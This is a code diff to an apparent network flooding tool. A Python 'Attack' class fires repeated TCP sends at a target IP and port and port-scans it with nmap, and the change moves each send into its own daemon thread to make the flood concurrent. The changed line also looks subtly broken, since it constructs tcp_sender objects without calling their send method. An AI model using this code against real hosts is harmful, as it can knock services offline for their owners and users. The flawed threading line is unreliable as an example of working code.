@@ -2,6 +2,7 @@ from lib.util.debug import Debug
 from lib.util.send_tcp import tcp_sender
 import nmap, socket, time
 from lib.util.colors import colors
+import threading
 class Attack:
 	def __init__(self, ip, port, packets):
 		self.ip = ip
@@ -10,7 +11,7 @@ class Attack:
 	def attack(self):
 		total = 0
 		for x in range(0, int(self.packets)):
-			tcp_sender(self.ip, self.port).send()
+			threading.Thread(target=tcp_sender, args=(self.ip, self.port,), daemon=True).start()
 			total+=1
 			scanner = nmap.PortScanner()
 			host = socket.gethostbyname(self.ip)
